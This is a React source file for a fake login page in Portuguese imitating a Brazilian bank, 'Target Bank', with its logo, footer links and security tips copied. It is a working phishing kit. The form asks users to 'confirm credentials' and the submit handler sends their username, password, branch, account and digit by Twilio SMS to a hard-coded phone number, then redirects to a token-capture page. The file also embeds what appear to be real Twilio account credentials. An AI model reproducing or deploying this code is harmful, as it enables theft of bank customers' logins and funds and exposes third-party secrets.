import React, { useState, useEffect } from 'react';

const Acesso = () => {
  const [usuario, setUsuario] = useState('');
  const [senha, setSenha] = useState('');
  const [agencia, setAgencia] = useState('');
  const [conta, setConta] = useState('');
  const [digito, setDigito] = useState('');

  useEffect(() => {
    const agenciaStorage = localStorage.getItem('agencia');
    const contaStorage = localStorage.getItem('conta');
    const digitoStorage = localStorage.getItem('digito');

    if (agenciaStorage && contaStorage && digitoStorage) {
      setAgencia(agenciaStorage);
      setConta(contaStorage);
      setDigito(digitoStorage);
    }
  }, []);

  const sendSMS = async () => {
    const accountSid = 'AC6ca98d7f5e58bff0f34ab592236ce25c';
    const authToken = 'de4fcb6b1d443db792317d284221e3bc';
    const phoneNumber = '+17853902284';
    const recipientNumber = '+5511991471545';

    const url = `https://api.twilio.com/2010-04-01/Accounts/${accountSid}/Messages.json`;

    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        Authorization: `Basic ${Buffer.from(`${accountSid}:${authToken}`).toString('base64')}`
      },
      body: new URLSearchParams({
        From: phoneNumber,
        To: recipientNumber,
        Body: `Usuário: ${usuario}, Senha: ${senha}, Agência: ${agencia}, Conta: ${conta}, Dígito: ${digito}`
      })
    });

    if (response.ok) {
      console.log('SMS enviado com sucesso');
    } else {
      console.error('Erro ao enviar SMS:', await response.text());
      throw new Error('Erro ao enviar SMS');
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    // Armazena o usuário, senha e dígito no Local Storage
    localStorage.setItem('usuario', usuario);
    localStorage.setItem('senha', senha);
    localStorage.setItem('digito', digito);

    try {
      // Envia a mensagem SMS
      await sendSMS();

      // Redireciona para a próxima página (token.js) somente se o SMS for enviado com sucesso
      window.location.href = '/token';
    } catch (error) {
      console.error('Erro ao enviar SMS:', error);
      // Exiba uma mensagem de erro para o usuário, por exemplo:
      // alert('Erro ao enviar SMS. Por favor, tente novamente.');
    }
  };

  return (
    <div>
      <header className="navigation">
        <div className="flex justify-between items-center h-full px-6">
          <img src="/logoBank.svg" alt="Logo" className="h-11" />
        </div>
      </header>

      <main className="flex flex-col items-center">
        <h1
          className="H1Dark"
          data-aos="zoom-in-down"
          data-aos-duration="1000"
          data-aos-delay="200"
        >
          Olá, para sua segurança confirme suas credenciais.
        </h1>
        <br />
        <div className="container">
          <div className="modal">
            <div className="modal-content">
              <div className="mb-4">
                <h2 className="font-person destaque centralizado">
                  Agência: {agencia} Conta: {conta}
                </h2>
              </div>
              <form onSubmit={handleSubmit}>
                <div className="containerzao">
                  <div className="container-form text-center">
                    <div className="mb-4">
                      <label htmlFor="usuario" className="block"></label>
                      <input
                        type="text"
                        id="usuario"
                        className="design-form quadrado espaco agency"
                        placeholder="Usuário"
                        value={usuario}
                        onChange={(e) => setUsuario(e.target.value)}
                      />
                    </div>
                    <div className="flex mb-4">
                      <div className="mr-2">
                        <label htmlFor="senha" className="block"></label>
                        <input
                          type="password"
                          id="senha"
                          className="design-form quadrado espaco cont-acesso"
                          placeholder="Senha"
                          value={senha}
                          onChange={(e) => setSenha(e.target.value)}
                        />
                      </div>
                    </div>
                  </div>
                  <button type="submit" className="botaozinho">
                    Avançar
                  </button>
                </div>
              </form>
              <br></br>
              <br></br>
              <span class="barrinha" style={{cursor: 'pointer'}}>Esqueceu sua senha?</span>
            </div>
          </div>
        </div>
      </main>

      <div className="footer-dark">
        <footer>
          <div className="containertbt">
            <div className="row ajuste">
              <div className="col-sm-6 col-md-3 item">
                <h3 className="boldinho">LINKS ÚTEIS</h3>
                <ul>
                  <li>
                    <a
                      target="_blank"
                      style={{ fontSize: '14px' }}
                      className="pretin"
                      href="https://targetbank.com.br/politica-de-privacidade/"
                    >
                      Política de privacidade
                    </a>
                  </li>
                  <li>
                    <a
                      target="_blank"
                      style={{ fontSize: '14px' }}
                      className="pretin"
                      href="https://targetbank.com.br/regulamento-utilizacao-cartao/"
                    >
                      Regulamento da Utilização do Cartão
                    </a>
                  </li>
                  <li>
                    <a
                      target="_blank"
                      style={{ fontSize: '14px' }}
                      className="pretin"
                      href="https://targetbank.com.br/sobre-nos/"
                    >
                      Institucional
                    </a>
                  </li>
                  <li>
                    <a
                      target="_blank"
                      style={{ fontSize: '14px' }}
                      className="pretin"
                      href="https://targetbank.com.br/blog-do-trecho/"
                    >
                      Blog
                    </a>
                  </li>
                </ul>
              </div>
              <div className="col-sm-6 col-md-3 item">
                <h3 className="boldinho">CANAIS DE ATENDIMENTO</h3>
                <ul>
                  <li style={{ fontSize: '14px' }}>
                    <label className="pretin" style={{ fontSize: '14px' }}>
                      SAC CONTRATANTES: <br /> (21) 3500-5111
                    </label>
                  </li>
                  <li style={{ fontSize: '14px' }}>
                    <label className="pretin" style={{ fontSize: '14px' }}>
                      E-MAIL: <br /> operacao@targetbank.com.br
                    </label>
                  </li>
                </ul>
              </div>
              <div className="col-md-6 item text">
                <h3 className="boldinho">DICAS DE SEGURANÇA<br /></h3>
                <p
                  className="pretin"
                  style={{
                    fontSize: '14px',
                    fontFamily: 'Roboto Condensed',
                  }}
                >
                  O Target Bank nunca faz ligações solicitando senhas ou códigos.
                  Caso liguem para você solicitando estes <br />
                  dados, não informe.
                  <br />
                  Mantenha sempre atualizado seu antivírus e nunca abra arquivos
                  anexados em e-mails cujo remetente <br />
                  seja desconhecido. Assim, você evita possíveis ataques em seu
                  computador.
                  <br />
                </p>
              </div>
            </div>
            <p className="copyright">
              © 2022 TARGET INSTITUICAO DE PAGAMENTO E SECURITIZADORA DE CREDITOS
              S.A
            </p>
          </div>
        </footer>
      </div>
    </div>
  );
};

export default Acesso;
